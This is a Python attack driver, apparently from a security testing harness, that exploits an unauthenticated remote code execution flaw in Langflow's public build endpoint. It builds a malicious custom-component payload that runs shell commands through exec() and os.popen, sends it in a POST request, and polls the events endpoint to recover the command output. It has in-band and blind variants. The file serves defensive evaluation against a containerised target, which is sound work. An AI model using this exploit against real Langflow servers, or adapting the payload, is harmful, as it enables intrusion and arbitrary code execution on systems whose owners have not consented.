"""Attack driver for Langflow CVE-2026-33017 (unauthenticated RCE via the
public build endpoint). Used by the scoreboard as a real, public-CVE target to
complement the owned mock-bank. Two variants:

  - in-band: the injected component re-raises the output of a shell command, so
    the command output comes back on a SECOND (polling) request. This is the
    cross-request-correlation case: the proxy confirms the actor on the POST and
    withholds the evidence that arrives on the later GET.
  - blind: the injected component only touches a marker file and echoes nothing,
    so no response carries evidence. This is the honest "ceiling" control: the
    response layer cannot help; the state oracle still shows execution.

The attack runs from the VM host (like a real external attacker); the target
runs in a container. State oracle = a marker file checked via `docker exec`.
"""
from __future__ import annotations

import json
import re
import time

from .common import HTTPResult, RunOutcome, http_request

FLOW_ID = "e8b4f8c2-7a1d-4e5f-9b3c-2a6d8f0e1b4a"
UID_RE = re.compile(r"uid=\d+\([a-z0-9_-]+\)")


def _component_code(marker: str, echo: bool) -> str:
    # Python source executed inside Langflow during graph compilation.
    if echo:
        cmd = f"id; touch {marker}"
        inner = (
            "from lfx.custom import Component\n"
            f"_x = exec(\"raise Exception(__import__('os').popen('{cmd}').read())\")\n"
            "class Pwn(Component):\n"
            "    display_name = \"Pwn\"\n"
            "    def build(self) -> None:\n"
            "        pass\n"
        )
    else:
        # Blind: force execution via the same exec() sink but echo nothing back
        # and do not raise, so no evidence appears in any response. Only the
        # state oracle (marker file) proves it ran.
        cmd = f"touch {marker}"
        inner = (
            "from lfx.custom import Component\n"
            f"_x = exec(\"__import__('os').popen('{cmd}').read()\")\n"
            "class Pwn(Component):\n"
            "    display_name = \"Pwn\"\n"
            "    def build(self) -> None:\n"
            "        pass\n"
        )
    return inner


def _payload(marker: str, echo: bool) -> str:
    node = {
        "id": "CustomComponent-pwn", "type": "genericNode",
        "data": {"id": "CustomComponent-pwn", "type": "CustomComponent", "node": {
            "template": {"code": {"type": "str", "value": _component_code(marker, echo)}, "_type": "CustomComponent"},
            "base_classes": ["CustomComponent"], "display_name": "Custom Component",
            "outputs": [{"types": ["CustomComponent"], "name": "Custom Component"}]}},
    }
    return json.dumps({"data": {"nodes": [node], "edges": []}})


def attack(base: str, marker: str, echo: bool = True) -> tuple[bool, int, list]:
    """Run the exploit. Returns (evidence_seen_by_attacker, requests, transcript)."""
    transcript = []
    hdr = {"Content-Type": "application/json", "Cookie": "client_id=anything"}
    body = _payload(marker, echo)
    r1: HTTPResult = http_request(base, "POST", f"/api/v1/build_public_tmp/{FLOW_ID}/flow", hdr, body)
    m1 = UID_RE.search(r1.text())
    entry1 = {"req": "POST build_public_tmp", "status": r1.status, "leaked": bool(m1)}
    if m1:
        entry1["evidence"] = m1.group(0)
    transcript.append(entry1)
    reqs = 1
    leaked = bool(m1)
    job_id = ""
    try:
        job_id = json.loads(r1.body).get("job_id", "")
    except Exception:  # noqa: BLE001
        pass
    if job_id:
        # Poll the events endpoint; the error event carries the command output.
        for _ in range(8):
            r2 = http_request(base, "GET",
                              f"/api/v1/build_public_tmp/{job_id}/events?event_delivery=polling",
                              {"Cookie": "client_id=anything"})
            reqs += 1
            m = UID_RE.search(r2.text())
            entry = {"req": "GET events (poll)", "status": r2.status, "leaked": bool(m)}
            if m:
                # Carry the literal proof so the transcript (and the panel's
                # proof highlight) shows what actually leaked, not just a flag.
                entry["evidence"] = m.group(0)
            transcript.append(entry)
            if m:
                leaked = True
                break
            if r2.status == 0:
                break
            time.sleep(0.5)
    return leaked, reqs, transcript


def run(base: str, marker: str, container: str, echo: bool, check_state, reset_state) -> RunOutcome:
    reset_state()
    out = RunOutcome()
    leaked, reqs, transcript = attack(base, marker, echo)
    out.evidence_leaked = leaked
    out.requests = reqs
    out.transcript = transcript
    out.backend_executed = check_state()
    out.blocked_pre_exec = (not out.backend_executed) and (not leaked)
    return out
